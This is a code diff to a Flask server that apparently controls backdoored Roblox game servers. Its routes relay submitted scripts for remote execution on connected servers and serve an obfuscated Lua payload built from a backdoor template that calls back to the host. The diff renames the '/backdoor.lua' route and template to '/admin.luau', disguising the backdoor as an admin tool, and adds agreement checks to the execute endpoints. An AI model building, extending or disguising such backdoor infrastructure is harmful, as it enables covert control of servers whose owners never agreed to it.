@@ -21,6 +21,7 @@ def module_exists(module_path):
     return os.path.exists(f"{module_path}/id.txt") or os.path.exists(f"{module_path}/script.luau")
 
 @executor.route("/api/execute", methods=["POST"])
+@discord_auth.require_agreement
 @discord_auth.require_login
 def web_execute():
     userid = request.args.get("userid")
@@ -47,6 +48,7 @@ end)"""
     return "NO CLIENT"
 
 @executor.route("/api/execute_ss", methods=["POST"])
+@discord_auth.require_agreement
 @discord_auth.require_login
 def web_execute_ss():
     userid = request.args.get("userid")
@@ -66,6 +68,7 @@ end)"""
     return "NO CLIENT"
 
 @executor.route("/api/execute_module", methods=["POST"])
+@discord_auth.require_agreement
 @discord_auth.require_login
 def web_execute_module():
     userid = request.args.get("userid")
@@ -105,11 +108,11 @@ def roblox_ping():
 
     return scripts_to_return
 
-@executor.route("/backdoor.lua", methods=["GET"])
-def backdoor_script():
+@executor.route("/admin.luau", methods=["GET"])
+def admin_script():
     with open(f"{PATH}/static/assets/lua/vlua.luau", encoding="utf8") as vlua_script:
         vlua_script = vlua_script.read()
-    rendered = render_template("assets/lua/backdoor.luau", endpoint=request.headers.get("Host"), vlua=vlua_script)
+    rendered = render_template("assets/lua/admin.luau", endpoint=request.headers.get("Host"), vlua=vlua_script)
     obfuscated = obfuscate(rendered) or rendered
 
     return send_file(obfuscated, mimetype='text/plain')
@@ -134,6 +137,7 @@ def roblox_player_ping():
     return "Connect to a server please!"
 
 @executor.route("/api/modules", methods=["GET"])
+@discord_auth.require_agreement
 @discord_auth.require_login
 def roblox_modules_ping():
     pinned = []
